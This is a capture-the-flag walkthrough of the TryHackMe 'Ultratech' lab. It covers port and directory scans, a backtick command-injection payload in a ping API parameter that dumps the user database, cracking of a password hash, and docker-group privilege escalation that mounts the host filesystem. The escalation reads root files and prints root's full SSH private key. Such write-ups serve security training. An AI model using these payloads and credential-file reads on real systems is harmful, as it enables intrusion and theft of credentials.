# Ultratech

Crenata | Saturday, October 23rd, 2021

***Link*** : [https://tryhackme.com/room/ultratech1](https://tryhackme.com/room/ultratech1)

---------------------------------

### Nmap Scan

```
nmap -sC -sV -oN nmap 10.10.247.171
```

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-23 17:44 WIB
Nmap scan report for 10.10.247.171
Host is up (0.38s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
8081/tcp open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.02 seconds
```

- ***All Ports***

```
nmap -v -p- -oN all-ports 10.10.247.171
```

```
# Nmap 7.91 scan initiated Sat Oct 23 19:39:55 2021 as: nmap -v -p- -oN all-ports 10.10.247.171
Increasing send delay for 10.10.247.171 from 0 to 5 due to 1212 out of 4038 dropped probes since last increase.
Nmap scan report for 10.10.247.171
Host is up (0.38s latency).
Not shown: 65530 closed ports
PORT      STATE    SERVICE
7708/tcp  filtered scinet
8081/tcp  open     blackice-icecap
19975/tcp filtered unknown
31331/tcp open     unknown
45138/tcp filtered unknown

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Oct 23 20:14:38 2021 -- 1 IP address (1 host up) scanned in 2083.18 seconds
```

---------------------------------

### Gobuster Scan

- ***Port:8081***

```
gobuster dir -u http://10.10.247.171:8081/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster.log
```

```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.247.171:8081/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/10/23 19:50:10 Starting gobuster in directory enumeration mode
===============================================================
/auth                 (Status: 200) [Size: 39]
/ping                 (Status: 500) [Size: 1094]
```

- ***Port:31331***

```
gobuster dir -u http://10.10.247.171:31331/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster-port-31331.log
```

```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.247.171:31331/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/10/23 20:07:59 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 324] [--> http://10.10.247.171:31331/images/]
/css                  (Status: 301) [Size: 321] [--> http://10.10.247.171:31331/css/]   
/js                   (Status: 301) [Size: 320] [--> http://10.10.247.171:31331/js/]    
/javascript           (Status: 301) [Size: 328] [--> http://10.10.247.171:31331/javascript/]
```

---------------------------------

```
http://10.10.247.171:31331/robots.txt
```

```
Allow: *
User-Agent: *
Sitemap: /utech_sitemap.txt
```

---------------------------------

```
http://10.10.247.171:31331/utech_sitemap.txt
```

```
/
/index.html
/what.html
/partners.html
```

---------------------------------

```
view-source:http://10.10.247.171:31331/partners.html
```

```
<script src='js/api.js'></script>
```

```
(function() {
	console.warn('Debugging ::');

	function getAPIURL() {
		return `${window.location.hostname}:8081`
	}
	
	function checkAPIStatus() {
		const req = new XMLHttpRequest();
		try {
			const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
			req.open('GET', url, true);
			req.onload = function (e) {
				if (req.readyState === 4) {
					if (req.status === 200) {
						console.log('The api seems to be running')
					} else {
						console.error(req.statusText);
					}
				}
			};
			req.onerror = function (e) {
				console.error(xhr.statusText);
			};
			req.send(null);
		}
		catch (e) {
			console.error(e)
			console.log('API Error');
		}
	}
	checkAPIStatus()
	const interval = setInterval(checkAPIStatus, 10000);
	const form = document.querySelector('form')
	form.action = `http://${getAPIURL()}/auth`;
	
})();
```

---------------------------------

```
http://10.10.247.171:8081/ping?ip=`cat%20utech.db.sqlite`
```

```
- r00tf357a0c52799563c7c7b76c1e7543a32
- admin0d0ea5111e3c1def594c1684e3b9be84
```

---------------------------------

```
http://10.10.247.171:8081/ping?ip=`base64%20-w%200%20utech.db.sqlite`
```

- Save the result as `utech.db.sqlite.b64`
- Run `base64 -d utech.db.sqlite.b64 > utech.db.sqlite` in terminal
- Run `sqlitebrowser utech.db.sqlite` in terminal

```
- admin:0d0ea5111e3c1def594c1684e3b9be84
- r00t:f357a0c52799563c7c7b76c1e7543a32
```

r00t's password hash cracked to `n100906` with `https://crackstation.net/`

---------------------------------

- ***SSH***

```
ssh r00t@10.10.247.171
```

```
r00t@ultratech-prod:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)

r00t@ultratech-prod:~$ docker images
REPOSITORY    TAG         IMAGE ID            CREATED             SIZE
bash          latest      495d6437fc1e        2 years ago         15.8MB

r00t@ultratech-prod:~$ docker run -v /:/mnt --rm -it bash
bash-5.0#

bash-5.0# cd mnt/
bash-5.0# cd root/
bash-5.0# cat private.txt 
# Life and acomplishments of Alvaro Squalo - Tome I

Memoirs of the most successful digital nomdad finblocktech entrepreneur
in the world.

By himself.

## Chapter 1 - How I became successful

bash-5.0# cat .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuDSna2F3pO8vMOPJ4l2PwpLFqMpy1SWYaaREhio64iM65HSm
sIOfoEC+vvs9SRxy8yNBQ2bx2kLYqoZpDJOuTC4Y7VIb+3xeLjhmvtNQGofffkQA
jSMMlh1MG14fOInXKTRQF8hPBWKB38BPdlNgm7dR5PUGFWni15ucYgCGq1Utc5PP
NZVxika+pr/U0Ux4620MzJW899lDG6orIoJo739fmMyrQUjKRnp8xXBv/YezoF8D
hQaP7omtbyo0dczKGkeAVCe6ARh8woiVd2zz5SHDoeZLe1ln4KSbIL3EiMQMzOpc
jNn7oD+rqmh/ygoXL3yFRAowi+LFdkkS0gqgmwIDAQABAoIBACbTwm5Z7xQu7m2J
tiYmvoSu10cK1UWkVQn/fAojoKHF90XsaK5QMDdhLlOnNXXRr1Ecn0cLzfLJoE3h
YwcpodWg6dQsOIW740Yu0Ulr1TiiZzOANfWJ679Akag7IK2UMGwZAMDikfV6nBGD
wbwZOwXXkEWIeC3PUedMf5wQrFI0mG+mRwWFd06xl6FioC9gIpV4RaZT92nbGfoM
BWr8KszHw0t7Cp3CT2OBzL2XoMg/NWFU0iBEBg8n8fk67Y59m49xED7VgupK5Ad1
5neOFdep8rydYbFpVLw8sv96GN5tb/i5KQPC1uO64YuC5ZOyKE30jX4gjAC8rafg
o1macDECgYEA4fTHFz1uRohrRkZiTGzEp9VUPNonMyKYHi2FaSTU1Vmp6A0vbBWW
tnuyiubefzK5DyDEf2YdhEE7PJbMBjnCWQJCtOaSCz/RZ7ET9pAMvo4MvTFs3I97
eDM3HWDdrmrK1hTaOTmvbV8DM9sNqgJVsH24ztLBWRRU4gOsP4a76s0CgYEA0LK/
/kh/lkReyAurcu7F00fIn1hdTvqa8/wUYq5efHoZg8pba2j7Z8g9GVqKtMnFA0w6
t1KmELIf55zwFh3i5MmneUJo6gYSXx2AqvWsFtddLljAVKpbLBl6szq4wVejoDye
lEdFfTHlYaN2ieZADsbgAKs27/q/ZgNqZVI+CQcCgYAO3sYPcHqGZ8nviQhFEU9r
4C04B/9WbStnqQVDoynilJEK9XsueMk/Xyqj24e/BT6KkVR9MeI1ZvmYBjCNJFX2
96AeOaJY3S1RzqSKsHY2QDD0boFEjqjIg05YP5y3Ms4AgsTNyU8TOpKCYiMnEhpD
kDKOYe5Zh24Cpc07LQnG7QKBgCZ1WjYUzBY34TOCGwUiBSiLKOhcU02TluxxPpx0
v4q2wW7s4m3nubSFTOUYL0ljiT+zU3qm611WRdTbsc6RkVdR5d/NoiHGHqqSeDyI
6z6GT3CUAFVZ01VMGLVgk91lNgz4PszaWW7ZvAiDI/wDhzhx46Ob6ZLNpWm6JWgo
gLAPAoGAdCXCHyTfKI/80YMmdp/k11Wj4TQuZ6zgFtUorstRddYAGt8peW3xFqLn
MrOulVZcSUXnezTs3f8TCsH1Yk/2ue8+GmtlZe/3pHRBW0YJIAaHWg5k2I3hsdAz
bPB7E9hlrI0AconivYDzfpxfX+vovlP/DdNVub/EO7JSO+RAmqo=
-----END RSA PRIVATE KEY-----
bash-5.0#
```